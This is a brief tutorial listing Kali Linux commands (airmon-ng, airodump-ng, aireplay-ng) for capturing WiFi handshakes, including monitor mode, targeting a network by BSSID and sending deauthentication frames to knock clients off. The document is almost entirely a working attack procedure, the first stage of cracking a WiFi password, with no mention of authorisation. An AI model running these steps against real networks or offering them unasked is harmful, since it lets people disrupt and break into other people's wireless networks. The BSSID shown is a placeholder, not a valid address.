  • Wifi Handshakes


Requirements :


Kali Linux

Internet





COMMANDS 




        
            lsusb 

            airmon-ng start wlan0

            airodump-ng wlan0

            airodump-ng -c 01 --bssid ab:bc:cd:ef:gh -w /root/wifi/ wlan0

            aireplay-ng -0 10 -a ab:bc:cd:ef:gh wlan0

Above are the commands to capture Wifi Handshakes with wifi adapters ......
